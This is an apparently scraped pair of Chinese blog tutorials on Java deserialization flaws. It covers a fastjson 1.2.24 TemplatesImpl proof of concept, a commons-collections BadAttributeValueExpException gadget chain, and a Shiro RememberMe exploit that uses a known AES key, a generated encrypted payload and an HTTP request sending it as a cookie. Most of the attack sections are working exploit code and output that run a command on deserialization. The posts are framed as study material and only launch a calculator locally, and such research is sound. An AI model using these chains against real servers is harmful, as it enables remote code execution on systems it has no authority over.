Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } public static void main(String[] args) throws Exception { // 读取编译后的 class 文件为字节数组 ClassPool classPool = ClassPool.getDefault(); final CtClass ctClass = classPool.get(EvalTransletClass.class.getName()); final byte[] bytes = ctClass.toBytecode(); // 将 class 字节数组编码为 base64 final String byteCode = Base64.getEncoder().encodeToString(bytes); // 构造 POC，这里使用 LinkedHashMap 是因为要保证顺序，@type 要放到第一位 final Map\u0026lt;String, Object\u0026gt; pocMap = new LinkedHashMap\u0026lt;\u0026gt;(); pocMap.put(\u0026quot;@type\u0026quot;, \u0026quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026quot;); pocMap.put(\u0026quot;_bytecodes\u0026quot;, Collections.singletonList(byteCode)); pocMap.put(\u0026quot;_name\u0026quot;, \u0026quot;守法市民小杜\u0026quot;); pocMap.put(\u0026quot;_outputProperties\u0026quot;, new Object()); pocMap.put(\u0026quot;_tfactory\u0026quot;, new Object()); final String poc = JSON.toJSONString(pocMap); System.out.println(\u0026quot;POC JSON:\u0026quot;+poc); // POC JSON:{\u0026quot;@type\u0026quot;:\u0026quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026quot;,\u0026quot;_bytecodes\u0026quot;:[\u0026quot;yv66vgAAADQAMQoABgAhCgAiACMIACQKACIAJQcAJwcAKAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQARRXZhbFRyYW5zbGV0Q2xhc3MBAAxJbm5lckNsYXNzZXMBADJMY24vdHlwZXNhZmUvanN2L2Zhc3Rqc29uL0V2YWwyJEV2YWxUcmFuc2xldENsYXNzOwEACkV4Y2VwdGlvbnMHACkBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAqAQAQTWV0aG9kUGFyYW1ldGVycwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEACkV2YWwyLmphdmEMAAcACAcAKwwALAAtAQAEY2FsYwwALgAvBwAwAQAwY24vdHlwZXNhZmUvanN2L2Zhc3Rqc29uL0V2YWwyJEV2YWxUcmFuc2xldENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAeY24vdHlwZXNhZmUvanN2L2Zhc3Rqc29uL0V2YWwyACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAAFgAEABcADQAYAAsAAAAMAAEAAAAOAAwADwAAABAAAAAEAAEAEQABABIAEwADAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAAHQALAAAAIAADAAAAAQAMAA8AAAAAAAEAFAAVAAEAAAABABYAFwACABAAAAAEAAEAGAAZAAAACQIAFAAAABYAAAABABIAGgADAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAIgALAAAAKgAEAAAAAQAMAA8AAAAAAAEAFAAVAAEAAAABABsAHAACAAAAAQAdAB4AAwAQAAAABAABABgAGQAAAA0DABQAAAAbAAAAHQAAAAIAHwAAAAIAIAAOAAAACgABAAUAJgANAAk=\u0026quot;],\u0026quot;_name\u0026quot;:\u0026quot;守法市民小杜\u0026quot;,\u0026quot;_outputProperties\u0026quot;:{}} // 反序列化为 Java 对象 JSON.parseObject(poc, Feature.SupportNonPublicField); } } 运行之后将会看到弹出了计算器。\n注 文中测试使用系统和工具版本如下：\n 操作系统 windows 10 20H2 jdk java 1.8.0_301 fastjson 1.2.24 javassist 3.28.0-GA 代码仓库 https://github.com/dushixiang/java-serialization-vulnerability  其他 此种方式可利用范围较小，但在高版本JDK上依然可以利用成功。\n常见的 Fastjson 漏洞利用还有 RMI/JNDI 和 LDAP，但在高版本的JDK中，Java官方觉得请求远程地址上的类是一个很危险的操作，所以在最新的JDK中默认关闭了这个功能，我们在后面也会详细介绍。\n","permalink":"https://typesafe.cn/posts/java-serialization-vulnerability-3/","summary":"声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。\nFastjson 是什么  fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。\n  fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。\n 以上摘自Fastjson GitHub 介绍。\n但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 NACOS 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 https://github.com/alibaba/nacos/releases/tag/1.3.0) ，可见漏洞危害之大。\n为什么会弃用 Fastjson ？ 想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 CVE-2017-18349 这一条，而 Jackson 竟然有高达 76 条。\n这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。\n那为什么会有公司弃用 Fastjson 呢？\n或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。\n尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。\nFastjson 漏洞产生原因 Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 https://github.","title":"Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理"},{"content":"声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。\n新的希望 0x00 在上一节中我们介绍了 Java 反序列化漏洞的成因和利用 commons-collections 3.1 搭配 sun.reflect.annotation.AnnotationInvocationHandler 实现远程命令执行的方式。但sun.reflect.annotation.AnnotationInvocationHandler 的问题已经在最新版 jdk 中修复，可利用范围仅能够局限于旧版本的jdk。经过安全人员的审计，另一个类 javax.management.BadAttributeValueExpException 出现在了安全人员的视野。\njavax.management.BadAttributeValueExpException 继承自 java.lang.Exception，java.lang.Exception 继承自 java.lang.Throwable，而 java.lang.Throwable 实现了 java.io.Serializable。因此 javax.management.BadAttributeValueExpException 符合了 可序列化 这个要求，同样的它也增加了 readObject 方法，这个类的完整代码如下：\npackage javax.management; import java.io.IOException; import java.io.ObjectInputStream; /** * Thrown when an invalid MBean attribute is passed to a query * constructing method. This exception is used internally by JMX * during the evaluation of a query. User code does not usually * see it. * * @since 1.5 */ public class BadAttributeValueExpException extends Exception { /* Serial version */ private static final long serialVersionUID = -3105272988410493376L; /** * @serial A string representation of the attribute that originated this exception. * for example, the string value can be the return of {@code attribute.toString()} */ private Object val; /** * Constructs a BadAttributeValueExpException using the specified Object to * create the toString() value. * * @param val the inappropriate value. */ public BadAttributeValueExpException (Object val) { this.val = val == null ? null : val.toString(); } /** * Returns the string representing the object. */ public String toString() { return \u0026#34;BadAttributeValueException: \u0026#34; + val; } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\u0026#34;val\u0026#34;, null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString(); } else { // the serialized object is from a version without JDK-8019292 fix  val = System.identityHashCode(valObj) + \u0026#34;@\u0026#34; + valObj.getClass().getName(); } } } 小伙伴们可能会很迷茫，这要何从下手？\n别着急，我来一点点的分析。\n首先我们来看这个方法的第一行代码 ObjectInputStream.GetField gf = ois.readFields();，它的意思是从已经序列化成字节数组的信息中获取 序列化前的类 的全部成员变量。\n第二行代码 Object valObj = gf.get(\u0026quot;val\u0026quot;, null); 的意思是获取名词为 val 的成员变量，如果获取不到就返回 null。\n接下来前两个的 if 判断很简单，就不解释了。\n第三个 if 判断中只要 System.getSecurityManager() 是空值或者 valObj 是基本数据包装类型就调用 toString() 方法转换为字符串。\n问题就出在这个 toString() 上。\n0x01 安全人员在审查 commons-collections 3.1 的源码时发现 org.apache.commons.collections.keyvalue.TiedMapEntry 的 toString() 方法如下：\npublic String toString() { return getKey() + \u0026#34;=\u0026#34; + getValue(); } getKey() 和 getValue() 代码如下：\npublic class TiedMapEntry implements Map.Entry, KeyValue, Serializable { /** Serialization version */ private static final long serialVersionUID = -8453869361373831205L; /** The map underlying the entry/iterator */ private final Map map; /** The key */ private final Object key; /** * Constructs a new entry with the given Map and key. * * @param map the map * @param key the key */ public TiedMapEntry(Map map, Object key) { super(); this.map = map; this.key = key; } // Map.Entry interface  //-------------------------------------------------------------------------  /** * Gets the key of this entry * * @return the key */ public Object getKey() { return key; } /** * Gets the value of this entry direct from the map. * * @return the value */ public Object getValue() { return map.get(key); } 代码省略... } getKey() 直接返回了字符串，不用考虑了。\ngetValue() 是从构造方法传入的 map 中根据 传入的key 获取值。那么有没有一个 Map 的 get 方法可以调用 org.apache.commons.collections.Transformer 的 transform 方法呢？答案是有的，而且它还是 commons-collections 3.1 中的一个类。\n0x02 org.apache.commons.collections.map.LazyMap 顾名思义是一个懒加载的 Map，它继承自 AbstractMapDecorator,并且实现了 Map 和 Serializable接口。 它的构造方法有两个参数，一个是 java.util.Map，一个是org.apache.commons.collections.Transformer。它重写了Map的 get 方法，先判断构造方法传入的 map 中是否包含 key，不包含时会调用 transformer 的 transform 的方法进行转换，并进行后续的赋值和返回，代码如下:\npublic Object get(Object key) { // create value for key if key is not currently in the map  if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } 绝地归来 经过上述步骤的分析，我们得到了一个调用链。\n ,--------------------. ,------------. |LazyMap | |TiedMapEntry| ,-----------------------. |--------------------| |------------| |Transformer | |Map map; | |Map map; | |-----------------------|--|Transformer factory;|---|String key; | |transform(Object input)| | | | | `-----------------------' |get(String key); | |toString(); | `--------------------' `------------' | | ,----------------------------------. |BadAttributeValueExpException | |----------------------------------| |TiedMapEntry val; | |readObject(ObjectInputStream ois);| `----------------------------------' 下面我们来实际测试一下。\n为简化代码，我们把序列化和反序列化代码做成工具类使用。\nimport java.io.*; /** * 序列化工具 */ public class Serializer { /** * 将对象序列化为字节数组 * @param obj 对象 * @return 字节数组 * @throws IOException IO异常 */ public static byte[] serialize(final Object obj) throws IOException { final ByteArrayOutputStream out = new ByteArrayOutputStream(); try (ObjectOutputStream objOut = new ObjectOutputStream(out)) { objOut.writeObject(obj); objOut.flush(); } return out.toByteArray(); } /** * 将字节数组反序列化对象 * @param bytes 字节数组 * @return 对象 * @throws IOException IO异常 * @throws ClassNotFoundException 类找不到异常 */ public static Object deserialize(byte[] bytes) throws IOException, ClassNotFoundException { try (ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(bytes))) { return input.readObject(); } } } 修改之前的测试代码。\nimport cn.typesafe.jsv.util.Serializer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.lang.reflect.Field; import java.nio.charset.StandardCharsets; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class Exp4 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[2]), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; Transformer transformerChain = ChainedTransformer.getInstance(transformers); // 在调用 get 方法时传入一个不存在的 key 时会调用 Transformer 的 transform 方法  Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain); // 在调用 toString 方法时会自动调用 getValue 方法并使用 构造方法传入的 key 当作 key  TiedMapEntry entry = new TiedMapEntry(lazyMap, \u0026#34;守法市民小杜\u0026#34;); // 创建BadAttributeValueExpException对象，类型是 public 的，无需使用反射创建  BadAttributeValueExpException obj = new BadAttributeValueExpException(null); // 成员 val 没有setVal 方法，只能通过反射修改  Field valField = obj.getClass().getDeclaredField(\u0026#34;val\u0026#34;); valField.setAccessible(true); valField.set(obj, entry); /*-----------------------以下是序列化和反序列化测试----------------------------*/ // 将用户序列化为字节数组，将字节数组进行base64编码，无论是通过网络或者是文件都可以发送到另一个系统进行反序列化  final String data = Base64.getEncoder().encodeToString(Serializer.serialize(obj)); System.out.println(\u0026#34;序列化后：\u0026#34; + data); // 将base64编码的数据再解码为字节数组  final Object o = Serializer.deserialize(Base64.getDecoder().decode(data.getBytes(StandardCharsets.UTF_8))); System.out.println(\u0026#34;反序列化：\u0026#34;+o); } } 在最新版 jdk 1.8.0_301 上测试通过，弹出了计算器。\n西斯的复仇 0x00 有杠精附体的朋友说我上节写的那个接口在现实环境中基本上不会有，那我们今天来介绍一个使用广泛的框架 shiro。\nshiro 的 RememberMe 功能就是利用了 Java 的反序列化来实现的，不过它并不是直接将对象序列化成数组后简单使用 base64 编码就写入到 Cookie 中，而是将对象字节数组进行了一次 AES 加密，最后才 base64 编码写入到 Cookie 中。\n以最新版 shiro 1.8.0 为例， org.apache.shiro.mgt.AbstractRememberMeManager 的 onSuccessfulLogin 方法中，当打开 RememberMe 后会调用 rememberIdentity 方法\npublic void onSuccessfulLogin(Subject subject, AuthenticationToken token, AuthenticationInfo info) { //always clear any previous identity:  forgetIdentity(subject); //now save the new identity:  if (isRememberMe(token)) { rememberIdentity(subject, token, info); } else { if (log.isDebugEnabled()) { log.debug(\u0026#34;AuthenticationToken did not indicate RememberMe is requested. \u0026#34; + \u0026#34;RememberMe functionality will not be executed for corresponding account.\u0026#34;); } } } rememberIdentity 方法如下：\npublic void rememberIdentity(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo) { // 生成身份认证信息  PrincipalCollection principals = getIdentityToRemember(subject, authcInfo); // 实现记住登录  rememberIdentity(subject, principals); } rememberIdentity 方法如下：\nprotected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) { // 将身份认证信息序列化为字节数组  byte[] bytes = convertPrincipalsToBytes(accountPrincipals); // 将字节数组写入到Cookie中  rememberSerializedIdentity(subject, bytes); } convertPrincipalsToBytes 方法如下：\nprotected byte[] convertPrincipalsToBytes(PrincipalCollection principals) { // 将身份认证信息序列化为字节数组，最终会调用 DefaultSerializer 的 serialize 方法 byte[] bytes = serialize(principals); if (getCipherService() != null) { // 如果加密服务存在则进行一次AES加密，在加密时会使用当前设置的密钥 bytes = encrypt(bytes); } return bytes; } rememberSerializedIdentity 方法如下：\nprotected void rememberSerializedIdentity(Subject subject, byte[] serialized) { if (!WebUtils.isHttp(subject)) { if (log.isDebugEnabled()) { String msg = \u0026#34;Subject argument is not an HTTP-aware instance. This is required to obtain a servlet \u0026#34; + \u0026#34;request and response in order to set the rememberMe cookie. Returning immediately and \u0026#34; + \u0026#34;ignoring rememberMe operation.\u0026#34;; log.debug(msg); } return; } HttpServletRequest request = WebUtils.getHttpRequest(subject); HttpServletResponse response = WebUtils.getHttpResponse(subject); //base 64 encode it and store as a cookie:  String base64 = Base64.encodeToString(serialized); Cookie template = getCookie(); //the class attribute is really a template for the outgoing cookies  Cookie cookie = new SimpleCookie(template); cookie.setValue(base64); cookie.saveTo(request, response); } 最终会将身份认证信息写入到 Cookie 中。\n反序列化的过程类似，不过是把这个流程反过来。因此我们可以得出一个结论。\n只要目标系统中同时有使用 shiro 和 commons-collections 3.1，并且在得知了AES密钥，即可触发远程命令执行漏洞。\n0x01 搭建测试环境 我们使用 springboot 搭建一个测试环境。\n使用 maven 创建好一个包含 web 的 springboot 项目后，在 pom.xml 增加两个依赖：\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.shiro\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;shiro-spring-boot-web-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.8.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 然后增加两个类配置 shiro 。\nimport org.apache.shiro.realm.Realm; import org.apache.shiro.realm.text.TextConfigurationRealm; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; @Configuration public class ShiroRealmConfig { @Bean public Realm realm() { TextConfigurationRealm realm = new TextConfigurationRealm(); // 配置账户信息  realm.setUserDefinitions(\u0026#34;user=password,user\\n\u0026#34; + \u0026#34;admin=password,admin\u0026#34;); realm.setRoleDefinitions(\u0026#34;admin=read,write\\n\u0026#34; + \u0026#34;user=read\u0026#34;); realm.setCachingEnabled(true); return realm; } } import org.apache.shiro.mgt.SecurityManager; import org.apache.shiro.web.mgt.CookieRememberMeManager; import org.apache.shiro.web.mgt.DefaultWebSecurityManager; import org.springframework.context.annotation.Configuration; import javax.annotation.PostConstruct; import javax.annotation.Resource; import java.util.Base64; @Configuration public class ShiroSecurityConfig { @Resource private SecurityManager securityManager; @PostConstruct public void init() { // 配置记住登录管理器，并且设置 AES 加密的 key  CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager(); cookieRememberMeManager.setCipherKey(Base64.getDecoder().decode(\u0026#34;zSyK5Kp6PZAAjlT+eeNMlg==\u0026#34;)); ((DefaultWebSecurityManager) securityManager).setRememberMeManager(cookieRememberMeManager); } } 最后启动项目。\n0x02 生成 payload import cn.typesafe.jsv.util.Serializer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import javax.management.BadAttributeValueExpException; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class Exp5 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026quot;getMethod\u0026quot;, new Class[]{String.class, Class[].class}, new Object[]{\u0026quot;getRuntime\u0026quot;, null}), new InvokerTransformer(\u0026quot;invoke\u0026quot;, new Class[]{Object.class, Object[].class}, new Object[2]), new InvokerTransformer(\u0026quot;exec\u0026quot;, new Class[]{String.class}, new Object[]{\u0026quot;calc\u0026quot;}) }; Transformer transformerChain = ChainedTransformer.getInstance(transformers); // 在调用 get 方法时传入一个不存在的 key 时会调用 Transformer 的 transform 方法 Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain); // 在调用 toString 方法时会自动调用 getValue 方法并使用 构造方法传入的 key 当作 key TiedMapEntry entry = new TiedMapEntry(lazyMap, \u0026quot;foo\u0026quot;); // 创建BadAttributeValueExpException对象，类型是 public 的，无需使用反射创建 BadAttributeValueExpException obj = new BadAttributeValueExpException(null); // 成员 val 没有setVal 方法，只能通过反射修改 Field valField = obj.getClass().getDeclaredField(\u0026quot;val\u0026quot;); valField.setAccessible(true); valField.set(obj, entry); /*-----------------------以下是序列化和反序列化测试----------------------------*/ final byte[] bytes = Serializer.serialize(obj); byte[] key = Base64.getDecoder().decode(\u0026quot;zSyK5Kp6PZAAjlT+eeNMlg==\u0026quot;); // 创建一个 shiro 的 AES 加密服务类 AesCipherService aesCipherService = new AesCipherService(); // 使用 AES 加密序列化后的字节数组 ByteSource encrypt = aesCipherService.encrypt(bytes, key); // 将加密后的字节数组转换使用 Base64 编码后输出 String encoder = Base64.getEncoder().encodeToString(encrypt.getBytes()); System.out.println(\u0026quot;序列化后+AES加密+base64 encode：\u0026quot; + encoder); /*// 使用Base64 解码字符串为字节数组， 并使用AES 解密字节数组 ByteSource decrypt = aesCipherService.decrypt(Base64.getDecoder().decode(encoder), key); // 反序列化为对象 final Object o = Serializer.deserialize(decrypt.getBytes()); System.out.println(\u0026quot;反序列化+AES解密+base64 decode：\u0026quot; + o);*/ } } 运行后输出：\n序列化后+AES加密+base64 encode：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 冒号后面的就是我们需要的 payload。\n0x03 一发入魂 我这里还是使用 IDEA 自带的工具进行测试。\n新建一个 poc.http 文件写入一下内容\nGET http://localhost:8080/ Cookie: JSESSIONID=x; rememberMe=8dlbzft11MsVfuSNNEJEVWaLQG6NbN4J+RCWkAoWRt5uCU9hQrw9hB8GM8znqBiVM0seFD9fpJobn8aRQZrTu+gF/gWXL4TRAfOWxJAxEESjBDP9H0mfU/ZLu4qzi0AQ4sWKEB1RiIiaYc41HtQqn7b5hNpGHInGVsF5Z4ZKKEvlVKXghjJMU0IW57sAnhwSZgia7HExu947n5doszR8t5Y9d3VtqoH1vxncMtB7X1xCdsttxov/bf7hrAwe8reDDaAYssEcJGUv2tTY1YUGYztsSmyZFenk/KfeN0wUbyhBCjCsCQB/gpbbsj+oB4CZv9sP8FToiCJhzld5rZE95HXenWJOy5r0h8CVlmlWBuXDKHJV94z18w3CJLIPGxTjOWE8wIboZBSahG1kOQd+qnn9aFhM2m0TnnpSy71yAZlGgZplWd0XKsjXGssgx/3Cxz6FJJhnPw/SH05jexO6lGlXQY6PBWn3HMzJySbfoz1O1wu/XtbU4rUT2pSBvr5EiRrMHpGlkh8NVHqCwX0eeFMYGLZipwFns7/y2e4UVkTJUUPcleKj69jVCf4aSkZx5qvK/9kTOV4s+NK3qPfW96rjh7t61iGlfaav5HpvA/UB8fcJU0K5juphx6V/8s871udQIvZtxa72+QIevoMzA/ld8CPBDtADHr5JlLkVTanfjFjwvzH+tqQku5S1TzJtXubqlV8QAXVCCM/M+cxvt6Xy+ctmovxfpJcbZ7I0S/zhgMHEaBPRRTw/66IwI3nikpdnC0ZYJ1gpNKLDxlgs4bEL4QLFFvPLMJLFSFF/7bLJ6XTTX035E0+gUAvU0n1nCNLCndLQVROROlcUMso9l9mdkGWxvGoDzI2JqAcZh6PfohVshD9DZhQsPRJ//4IBXIjdxC9wbrnyLRjM9NetEQbMcl0r3euXpgybuWqiA8oEuD2/jSbqyRFI/7lkDmDUue3fWmLr/BkLRLPWMyb7OwZv/vr+xy6wVweK+eUGIrba2XJFFc2zJynn+Q/K/rj2fIsRAwL1ufCngiOpXBMtD